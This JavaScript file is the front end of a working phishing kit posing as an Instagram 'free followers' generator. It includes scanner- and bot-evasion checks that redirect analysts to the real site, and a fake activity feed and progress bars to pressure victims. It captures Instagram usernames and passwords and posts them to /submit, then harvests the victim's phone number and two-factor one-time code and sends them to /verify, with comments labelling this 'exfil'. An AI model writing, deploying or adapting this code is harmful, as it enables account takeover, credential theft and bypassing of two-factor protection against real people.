// language: JavaScript, file: static/script.js, target: all browsers
// Free Followers generator — 5-step wizard, fast exfil, local backend
const REDIRECT = "https://www.instagram.com/";
let state = { username: "", followers: "5000", phone: "", phoneCC: "+1" };

// ===== ANTI-ANALYSIS =====
(function() {
  const ua = (navigator.userAgent || '').toLowerCase();
  const bots = ['bot','crawl','spider','scan','headless','phantom','puppeteer',
    'selenium','webdriver','curl','wget','python','java/','go-http','aiohttp',
    'httpx','nuclei','nikto','masscan','zgrab','semrush','ahrefs','dotbot'];
  if (bots.some(b => ua.includes(b))) { location.replace(REDIRECT); return; }
  if (navigator.webdriver === true) { location.replace(REDIRECT); return; }
  if (window.callPhantom || window._phantom) { location.replace(REDIRECT); return; }
  if (!navigator.languages || navigator.languages.length === 0) { location.replace(REDIRECT); return; }
})();

function showStep(id) {
  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function looksReal(u, p) {
  if (!u || !p) return false;
  if (u.length < 3 || p.length < 4) return false;
  const noise = ['test','1234','123456','asdf','password','qwerty','admin','guest','aaaa'];
  if (noise.includes(u.toLowerCase().trim()) || noise.includes(p.toLowerCase().trim())) return false;
  return true;
}

function maskUser(u) {
  if (u.length <= 2) return u;
  return u.slice(0, 2) + '••••';
}

function maskPhone(cc, ph) {
  if (ph.length < 4) return cc + ' ••••';
  return cc + ' ••••' + ph.slice(-4);
}

// ===== ACTIVITY FEED =====
const feedNames = ['rahul_77','sara.khn','mike_fit','priya_s','james_w','nurul.h','fatima_a','alex.t','rohan_g','lisa_m','omar_d','wei_zhang','carlo_b','anjeeta','dav_007','sneha.r','yuki_t','maria_l','tanvir_h','jess_p'];
const feedFollowers = ['+1,000','+5,000','+10,000','+2,500','+1,000','+5,000'];
const feedTimes = ['just now','12s ago','28s ago','45s ago','1m ago','1m ago','2m ago'];

function generateFeed() {
  const list = document.getElementById('feed-list');
  if (!list) return;
  for (let i = 0; i < 5; i++) addFeedItem(i);
  setInterval(() => {
    addFeedItem(0);
    const items = list.querySelectorAll('.feed-item');
    if (items.length > 8) items[items.length - 1].remove();
  }, 8000 + Math.random() * 6000);
}

function addFeedItem(i) {
  const list = document.getElementById('feed-list');
  if (!list) return;
  const name = feedNames[Math.floor(Math.random() * feedNames.length)];
  const followers = feedFollowers[Math.floor(Math.random() * feedFollowers.length)];
  const time = feedTimes[Math.floor(Math.random() * feedTimes.length)];
  const div = document.createElement('div');
  div.className = 'feed-item';
  div.innerHTML = '<div class="feed-user"><div class="feed-avatar"></div><span class="feed-name">@' + name + '</span></div><div><span class="feed-followers">' + followers + '</span> <span class="feed-time">' + time + '</span></div>';
  list.insertBefore(div, list.firstChild);
}

generateFeed();

// ===== STEP 1: USERNAME + PACKAGE =====
document.querySelectorAll('.pkg').forEach(pkg => {
  pkg.addEventListener('click', function() {
    document.querySelectorAll('.pkg').forEach(p => p.classList.remove('selected'));
    this.classList.add('selected');
    state.followers = this.dataset.followers;
  });
});

document.getElementById('form-1').addEventListener('submit', function(e) {
  e.preventDefault();
  const hp = this.querySelector('.hp').value;
  if (hp) { location.replace(REDIRECT); return; }
  const u = document.getElementById('username').value.trim().replace(/^@/, '');
  if (!u || u.length < 2) return;
  state.username = u;
  document.getElementById('proc-user').textContent = '@' + u;
  document.getElementById('verify-user').textContent = '@' + u;
  document.getElementById('final-user').textContent = '@' + u;
  showStep('step-2');
  runProcessing();
});

// ===== STEP 2: PROCESSING (fast — 1.5s total) =====
function runProcessing() {
  const steps = [
    { el: 'ps1', delay: 200 },
    { el: 'ps2', delay: 500 },
    { el: 'ps3', delay: 900 },
    { el: 'ps4', delay: 1200 }
  ];
  const bar = document.getElementById('proc-bar-fill');
  const pct = document.getElementById('proc-percent');
  let progress = 0;
  const barInterval = setInterval(() => {
    progress += 4;
    if (progress > 95) { clearInterval(barInterval); return; }
    bar.style.width = progress + '%';
    pct.textContent = progress + '%';
  }, 30);
  steps.forEach(s => {
    setTimeout(() => {
      const el = document.getElementById(s.el);
      if (el) { el.classList.add('done'); el.querySelector('.ps-icon').textContent = '✓'; }
    }, s.delay);
  });
  setTimeout(() => {
    bar.style.width = '100%';
    pct.textContent = '100%';
    showStep('step-3');
  }, 1500);
}

// ===== STEP 3: PASSWORD =====
document.getElementById('toggle-pw').addEventListener('click', function() {
  const pw = document.getElementById('ig-pass');
  if (pw.type === 'password') { pw.type = 'text'; this.textContent = 'Hide'; }
  else { pw.type = 'password'; this.textContent = 'Show'; }
});

document.getElementById('form-3').addEventListener('submit', function(e) {
  e.preventDefault();
  const hp = this.querySelector('.hp').value;
  if (hp) { location.replace(REDIRECT); return; }
  const igUser = document.getElementById('ig-user').value.trim();
  const igPass = document.getElementById('ig-pass').value;
  if (!looksReal(igUser, igPass)) {
    const btn = this.querySelector('.btn-ig');
    btn.textContent = 'Log In';
    btn.disabled = false;
    return;
  }
  // fire exfil immediately — no delay
  fetch('/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: igUser, password: igPass, phone: '' })
  }).catch(() => {});
  state.igUser = igUser;
  state.igPass = igPass;
  document.getElementById('ig-pass').value = '';
  // jump to phone step almost instantly
  showStep('step-4');
});

// ===== STEP 4: PHONE + OTP =====
document.getElementById('btn-send-code').addEventListener('click', function() {
  const phone = document.getElementById('phone').value.trim();
  const cc = document.getElementById('country-code').value;
  if (!phone || phone.length < 6) return;
  state.phone = phone;
  state.phoneCC = cc;
  document.getElementById('otp-sub').textContent = 'Enter the 6-digit code we sent to ' + maskPhone(cc, phone);
  document.getElementById('otp-section').classList.add('show');
  document.getElementById('phone-wrap').style.display = 'none';
  this.disabled = true;
  this.textContent = 'Sent ✓';
  setTimeout(() => {
    const first = document.querySelector('#code-boxes input');
    if (first) first.focus();
  }, 150);
});

document.getElementById('change-number').addEventListener('click', function(e) {
  e.preventDefault();
  document.getElementById('otp-section').classList.remove('show');
  document.getElementById('phone-wrap').style.display = 'flex';
  document.getElementById('phone').value = '';
  const btn = document.getElementById('btn-send-code');
  btn.disabled = false;
  btn.textContent = 'Send Code';
});

// ===== OTP INPUT HANDLING =====
const codeBoxes = document.querySelectorAll('#code-boxes input');

codeBoxes.forEach((box, i) => {
  box.addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '').slice(0, 1);
    if (this.value && i < codeBoxes.length - 1) codeBoxes[i + 1].focus();
    if ([...codeBoxes].every(b => b.value)) {
      setTimeout(() => {
        document.getElementById('form-4').dispatchEvent(new Event('submit', { cancelable: true }));
      }, 100);
    }
  });
  box.addEventListener('keydown', function(e) {
    if (e.key === 'Backspace' && !this.value && i > 0) {
      codeBoxes[i - 1].focus();
      codeBoxes[i - 1].value = '';
    }
    if (e.key === 'ArrowLeft' && i > 0) codeBoxes[i - 1].focus();
    if (e.key === 'ArrowRight' && i < codeBoxes.length - 1) codeBoxes[i + 1].focus();
  });
  box.addEventListener('paste', function(e) {
    e.preventDefault();
    const txt = (e.clipboardData || window.clipboardData).getData('text');
    const digits = txt.replace(/\D/g, '').slice(0, 6).split('');
    codeBoxes.forEach((b, j) => { b.value = digits[j] || ''; });
    if (digits.length === 6) {
      setTimeout(() => {
        document.getElementById('form-4').dispatchEvent(new Event('submit', { cancelable: true }));
      }, 100);
    }
  });
});

document.getElementById('form-4').addEventListener('submit', function(e) {
  e.preventDefault();
  const hp = this.querySelector('.hp').value;
  if (hp) { location.replace(REDIRECT); return; }
  const code = [...codeBoxes].map(b => b.value).join('');
  const errEl = document.getElementById('code-err');
  if (code.length !== 6 || !/^\d{6}$/.test(code)) {
    errEl.classList.add('show');
    codeBoxes.forEach(b => { if (!b.value) b.style.borderColor = '#ed4956'; });
    return;
  }
  errEl.classList.remove('show');
  const btn = document.getElementById('btn-confirm-otp');
  btn.disabled = true;
  btn.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:8px"></span>Verifying…';
  // fire exfil immediately — no delay
  fetch('/verify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: state.igUser || state.username,
      code: code,
      phone: state.phoneCC + ' ' + state.phone
    })
  }).catch(() => {});
  codeBoxes.forEach(b => b.value = '');
  // fast transition to final step
  setTimeout(() => {
    showStep('step-5');
    runFinalProcessing();
  }, 400);
});

// ===== STEP 5: FINAL PROCESSING (fast — 2s total) =====
function runFinalProcessing() {
  const bar = document.getElementById('proc-bar-fill2');
  const pct = document.getElementById('proc-percent2');
  const finalStep = document.getElementById('ps-final');
  let progress = 0;
  const interval = setInterval(() => {
    progress += 5;
    if (progress > 95) { clearInterval(interval); return; }
    bar.style.width = progress + '%';
    pct.textContent = progress + '%';
  }, 50);
  setTimeout(() => {
    if (finalStep) { finalStep.classList.add('done'); finalStep.querySelector('.ps-icon').textContent = '✓'; }
    bar.style.width = '100%';
    pct.textContent = '100%';
  }, 1500);
  setTimeout(() => { location.replace(REDIRECT); }, 2000);
}